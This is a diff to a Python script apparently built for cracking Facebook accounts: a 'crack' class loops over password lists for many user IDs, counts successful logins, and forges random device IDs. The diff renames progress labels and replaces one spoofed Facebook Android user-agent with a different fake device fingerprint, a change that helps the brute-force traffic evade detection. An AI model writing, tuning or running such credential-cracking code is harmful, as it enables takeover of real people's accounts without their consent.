@@ -735,7 +735,7 @@ class crack:
 
     def __free__(self,user,__juts__,_jat):
         global ok,cp,f2,tl
-        sys.stdout.write(f'\r{PP}[M1] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} '),
+        sys.stdout.write(f'\r{PP}[M2] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} '),
         sys.stdout.flush()
         for pw in __juts__:
             try:
@@ -880,7 +880,7 @@ class crack:
 
     def __mmb__(self,user,__juts__,_jat):
         global ok,cp,f2,tl
-        sys.stdout.write(f'\r{PP}[M1] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} '),
+        sys.stdout.write(f'\r{PP}[M3] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} '),
         sys.stdout.flush()
         for pw in __juts__:
             try:
@@ -894,7 +894,7 @@ class crack:
                 gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                 gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
                 net=random.choice(['ZONG', 'Jazz'])
-                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.75,width=1080,height=2131};FBLC/en_US;FBRV/366716093;FBCR/Telenor;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.0,width=1440,height=3840};FBLC/fr_FR;FBRV/186014459;FBCR/Sony;FBMF/Motorola;FBBD/LeEco;FBPN/com.facebook.katana;FBDV/SM-G970F;FBSV/11;FBOP/8;FBCA/x86_64;FBSS/17;]'
                 device = str(uuid.uuid4())
                 adid = str(uuid.uuid4())
                 data = {
@@ -1895,7 +1895,6 @@ def cutrs():
         print ('\033[1;33mExample 2000, 5000, 10000, 20000, etc..')
         input('\033[1;32mPress Enter Go To Back\033[0;97m')
         cutrs()
-
 
 if __name__ == '__main__':
     os.system('git pull')
